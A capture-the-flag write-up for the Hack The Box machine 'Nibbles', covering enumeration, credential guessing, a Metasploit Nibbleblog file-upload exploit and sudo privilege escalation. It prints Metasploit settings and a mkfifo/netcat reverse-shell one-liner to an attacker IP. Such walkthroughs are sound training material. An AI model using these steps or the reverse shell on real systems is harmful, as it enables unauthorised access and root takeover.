![logo](/logo.png)

# [Nibbles- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 13 Jan 2018 as the fifth machine on HTB,Nibbles  created by [mrb3n](https://app.hackthebox.com/users/2984) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *msfconsole
  *monitor.sh
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/bashed 10.10.10.76
```

###### Output 

![](/Linux/Linux-Easy/Nibbles/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/nibbles 10.10.10.75                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 20:05 EAT
Nmap scan report for 10.10.10.75
Host is up (0.55s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.12 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.18`. 

port[22]- ssh
port[80]- http

when we naviagate to [http://10.10.10.75](http://10.10.10.75)  we find a page with the hello word . Attempting to view the source of index.html reveals a comment referencing a `/nibbleblog/directory`.

![](/Linux/Linux-Easy/Nibbles/Screenshots/sources.png)

lests `fuzz` for the files in the `nibblesdirectory`  

```sh
ffuf -u http://10.10.10.75/nibblesblog/FUZZ -w /usr/share/wordlists/dirb/common.txt  -mc 200,301,302,401,402,403 -e .txt,.md,.php
```

![](/Linux/Linux-Easy/Nibbles/Screenshots/ffuf.png)


we find some intersting things on the directory like `admin.php` lets navigate to it and see what is their

![](/Linux/Linux-Easy/Nibbles/Screenshots/nibbles.png)


so when In exploring the resulting paths, `/nibbleblog/content` is interesting, and has dir lists enabled. Digging deeper, there’s a page at `/nibbleblog/content/private/users.xml` which reveals a user, `admin`, as well as the IPs that have tried to log in as it:

![](/Linux/Linux-Easy/Nibbles/Screenshots/images.png)

so lets log in and be able to guess the passwords first which is (admin:nibbles)

![](/Linux/Linux-Easy/Nibbles/Screenshots/loggedin.png)

A quick search finds the Metasploit module `exploit/multi/http/nibbleblog_file_upload`, however this exploit requires valid credentials (admin:nibbles)

```sh
msfconsole
search nibble
use 0
show options
```

![](/Linux/Linux-Easy/Nibbles/Screenshots/msfconsole.png)

```sh
set TARGETURI /nibbleblog/
set USERNAME admin
set PASSWORD nibbles
set RHOSTS 10.10.10.75
set LHOST 10.10.14.15
run
```

![](Linux/Linux-Easy/Nibbles/Screenshots/meterpreter.png)

and we get a `meterpreter shell`  let upgrade to shell

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

Running sudo -l to check for any NOPASSWD binaries reveals an entry for `/home/nibbler/personal/stuff/monitor.sh`.

![](/Linux/Linux-Easy/Nibbles/Screenshots/sudol.png)

we can get the user flag from 

![](/Linux/Linux-Easy/Nibbles/Screenshots/userflag.png)

This file does not exist however, so it is possible to create a simple bash script in its place to achieve root access.

![](/Linux/Linux-Easy/Nibbles/Screenshots/mkdir.png)

```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 1337 > /tmp/f" >> monitor.sh
```

![](/Linux/Linux-Easy/Nibbles/Screenshots/echosh.png)

and just like that we have our shell

![](/Linux/Linux-Easy/Nibbles/Screenshots/shellroot.png)

	-------------------------END successful attack @lesley----------------------








